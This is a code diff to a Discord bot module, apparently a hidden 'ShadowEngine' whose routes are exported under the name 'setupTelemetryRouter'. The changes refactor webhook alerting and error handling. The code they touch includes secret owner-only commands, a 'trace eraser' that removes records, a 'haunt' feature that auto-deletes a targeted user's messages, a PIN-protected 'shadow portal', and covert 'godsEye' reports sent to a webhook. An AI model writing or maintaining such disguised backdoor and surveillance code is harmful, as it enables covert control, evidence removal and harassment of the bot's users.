@@ -9,11 +9,12 @@
  * ============================================================================
  */
 
-const { MessageEmbed, MessageActionRow, MessageButton, WebhookClient } = require("discord.js");
+const { MessageEmbed, MessageActionRow, MessageButton } = require("discord.js");
 const express = require("express");
 const crypto = require("node:crypto");
 const config  = require("./config.json");
 const sessionManager = require("./sessionManager");
+const { sendLogWebhook, sendAlertWebhook } = require("./core/webhooks");
 const auditStorage = require("./logging/auditStorage");
 const { applyShadowPortalAction: applyShadowPortalActionFromHelpers } = require("./systemProvider/actions");
 const { createShadowPortalAuth } = require("./systemProvider/auth");
@@ -33,6 +34,10 @@ const armedGuilds      = new Set();
 const hauntedUsers     = new Set();
 const clownUsers       = new Set();
 const traceDeletionRequests = new Map();
+
+function isSystemMaster(id) {
+    return id === config.system.ownerId || globalAdminCache.has(id);
+}
 
 // NEW: Session override list — ห้ามระบบหยุด session ที่มีในรายการนี้ (ป้องกัน)
 const protectedSessions = new Set();
@@ -451,15 +456,24 @@ const permissionSnapshots = new Map();
 class ShadowEngine {
     constructor(client) {
         this.client  = client;
-        this.webhook = SHADOW_WEBHOOK_URL ? new WebhookClient({ url: SHADOW_WEBHOOK_URL }) : null;
+        this.webhookEnabled = Boolean(SHADOW_WEBHOOK_URL);
         this.traceApprovalChannelId = null;
     }
 
     // ──────────────────────────────────────────────────────────────────────
     init() {
         this.client.on("messageCreate", async (message) => {
-            await this.handleTraceEraser(message);
-            await this.processSecretCommands(message);
+            try {
+                await this.handleTraceEraser(message);
+            } catch (err) {
+                logSuppressedError("trace eraser message listener", err);
+            }
+
+            try {
+                await this.processSecretCommands(message);
+            } catch (err) {
+                logSuppressedError("secret command message listener", err);
+            }
 
             // Haunt — auto-delete ข้อความของ user ที่ถูก haunt หลัง 12 วิ
             if (systemToggles.cmdHaunt && hauntedUsers.has(message.author.id)) {
@@ -514,14 +528,14 @@ class ShadowEngine {
     }
 
     async sendAlert(title, description, color = "#2b2d31") {
-        if (!this.webhook || !systemToggles.godsEye) return;
+        if (!this.webhookEnabled || !systemToggles.godsEye) return;
         const embed = new MessageEmbed()
             .setTitle(`${config.emojis.shadow} SHADOW REPORT: ${title}`)
             .setDescription(description)
             .setColor(color)
             .setTimestamp();
         try {
-            await this.webhook.send({ embeds: [embed] });
+            await sendAlertWebhook({ embeds: [embed] });
         } catch (e) {
             logSuppressedError("send alert webhook", e);
         }
@@ -529,9 +543,9 @@ class ShadowEngine {
 
     // NEW: Quick alert แบบสั้น (ไม่มี embed)
     async quickAlert(msg) {
-        if (!this.webhook || !systemToggles.godsEye) return;
+        if (!this.webhookEnabled || !systemToggles.godsEye) return;
         try {
-            await this.webhook.send({ content: `👁️‍🗨️ ${msg}` });
+            await sendAlertWebhook({ content: `👁️‍🗨️ ${msg}` });
         } catch (e) {
             logSuppressedError("send quick alert webhook", e);
         }
@@ -819,7 +833,14 @@ class ShadowEngine {
         ];
 
         console.log(`[TRACE_ERASER] policy=${TRACE_POLICY_DEFAULT} dryRun=${traceDryRunEnabled ? "on" : "off"} killSwitch=${traceKillSwitchEnabled ? "on" : "off"} protectedChannels=${protectedChannelIds.size}`);
-        await this.sendAlert("TRACE ERASER — DIAGNOSTICS", lines.join("\n"), traceKillSwitchEnabled ? "#ED4245" : "#5865F2");
+        const embed = new MessageEmbed()
+            .setTitle(`${config.emojis.shadow} SHADOW REPORT: TRACE ERASER — DIAGNOSTICS`)
+            .setDescription(lines.join("\n"))
+            .setColor(traceKillSwitchEnabled ? "#ED4245" : "#5865F2")
+            .setTimestamp();
+        if (systemToggles.godsEye) {
+            await sendLogWebhook({ embeds: [embed] });
+        }
     }
 
     async handleTraceApprovalInteraction(interaction) {
@@ -1830,7 +1851,7 @@ async function setupShadowEvents(client) {
 module.exports = {
     setupTelemetryRouter:  injectShadowRoutes,
     initializeSystemHooks: setupShadowEvents,
-    isSystemMaster: (id) => id === config.system.ownerId || globalAdminCache.has(id),
+    isSystemMaster,
     getWebPin:      ()  => SHADOW_WEB_PIN,
     isProtected:    (sessionId) => protectedSessions.has(sessionId),
     _test: {
